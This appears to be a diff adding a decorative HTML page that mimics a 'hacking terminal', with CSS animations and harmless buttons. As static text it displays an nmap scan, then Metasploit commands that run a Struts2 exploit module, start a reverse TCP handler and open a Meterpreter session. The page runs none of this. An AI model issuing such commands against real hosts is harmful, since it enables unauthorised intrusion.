@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kali Linux Hacking Terminal</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            margin: 0;
+            padding: 0;
+            background: #000;
+            color: #00ff00;
+            overflow: hidden;
+        }
+        .container {
+            position: relative;
+            width: 100%;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        .terminal {
+            width: 90%;
+            max-width: 800px;
+            height: 80%;
+            background: rgba(0, 0, 0, 0.9);
+            border: 2px solid #00ff00;
+            border-radius: 10px;
+            padding: 20px;
+            box-shadow: 0 0 20px #00ff00;
+            overflow-y: auto;
+            animation: glow 2s infinite alternate;
+        }
+        .header {
+            text-align: center;
+            font-size: 2em;
+            margin-bottom: 20px;
+            animation: fadeIn 3s ease-in-out;
+        }
+        .command {
+            margin: 10px 0;
+            animation: type 2s steps(40, end) forwards;
+        }
+        .output {
+            color: #fff;
+            margin-left: 20px;
+            animation: slideIn 1s ease-out forwards;
+        }
+        .button {
+            background: #00ff00;
+            color: #000;
+            border: none;
+            padding: 10px 20px;
+            margin: 10px;
+            cursor: pointer;
+            font-family: inherit;
+            border-radius: 5px;
+            transition: background 0.3s;
+        }
+        .button:hover {
+            background: #00cc00;
+        }
+        .matrix-bg {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text fill="%2300ff00" font-size="10" x="10" y="20">010101</text><text fill="%2300ff00" font-size="10" x="30" y="40">101010</text><text fill="%2300ff00" font-size="10" x="50" y="60">010101</text></svg>');
+            opacity: 0.1;
+            z-index: -1;
+            animation: scroll 10s linear infinite;
+        }
+
+        @keyframes glow {
+            from { box-shadow: 0 0 20px #00ff00; }
+            to { box-shadow: 0 0 30px #00ff00, 0 0 40px #00ff00; }
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        @keyframes type {
+            from { width: 0; }
+            to { width: 100%; }
+        }
+        @keyframes slideIn {
+            from { transform: translateX(-100px); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+        @keyframes scroll {
+            from { transform: translateY(0); }
+            to { transform: translateY(-100px); }
+        }
+    </style>
+</head>
+<body>
+    <div class="matrix-bg"></div>
+    <div class="container">
+        <div class="terminal">
+            <div class="header">Kali Linux Hacking Terminal</div>
+            <div class="command">root@kali:~# nmap -sV -O target.com</div>
+            <div class="output">Starting Nmap 7.91 ( https://nmap.org ) at 2023-10-01 12:00 EDT<br>
+            Nmap scan report for target.com (192.168.1.1)<br>
+            Host is up (0.0010s latency).<br>
+            PORT   STATE SERVICE VERSION<br>
+            22/tcp open  ssh     OpenSSH 8.2p1<br>
+            80/tcp open  http    Apache httpd 2.4.41<br>
+            Device type: general purpose<br>
+            Running: Linux 4.X|5.X<br>
+            OS details: Linux 4.15 - 5.6<br>
+            Network Distance: 1 hop</div>
+            <div class="command">root@kali:~# metasploit</div>
+            <div class="output">msf6 > use exploit/multi/http/struts2_content_type_ognl<br>
+            msf6 exploit(struts2_content_type_ognl) > set RHOSTS 192.168.1.1<br>
+            RHOSTS => 192.168.1.1<br>
+            msf6 exploit(struts2_content_type_ognl) > exploit<br>
+            [*] Started reverse TCP handler on 192.168.1.100:4444<br>
+            [*] Sending stage (39274 bytes) to 192.168.1.1<br>
+            [*] Meterpreter session 1 opened (192.168.1.100:4444 -> 192.168.1.1:12345)</div>
+            <button class="button" onclick="alert('Hacking simulation complete!')">Run Exploit</button>
+            <button class="button" onclick="location.reload()">Restart Terminal</button>
+        </div>
+    </div>
+    <script>
+        // Simple JS for typing effect on load
+        const commands = document.querySelectorAll('.command');
+        commands.forEach((cmd, index) => {
+            setTimeout(() => {
+                cmd.style.animationPlayState = 'running';
+            }, index * 2000);
+        });
+    </script>
+</body>
+</html>
